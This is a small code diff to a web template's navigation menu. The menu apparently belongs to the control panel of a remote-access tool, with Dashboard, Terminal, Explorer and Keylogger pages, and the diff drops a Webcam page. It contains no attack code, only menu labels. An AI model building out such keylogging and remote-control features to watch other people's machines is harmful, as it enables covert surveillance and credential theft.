@@ -4,8 +4,7 @@
             ('dashboard', '📊 Dashboard'),
             ('terminal', '🧠 Terminal'),
             ('explorer', '📁 Explorer'),
-            ('keylogger', '⌨️ Keylogger'),
-            ('webcam', '📷 Webcam')
+            ('keylogger', '⌨️ Keylogger')
         ] %}
         {% for endpoint, label in menu_items %}
             <li class="{% if request.path == url_for(endpoint) %}active{% endif %} {% if endpoint != 'dashboard' %}if_auth{% endif %}">
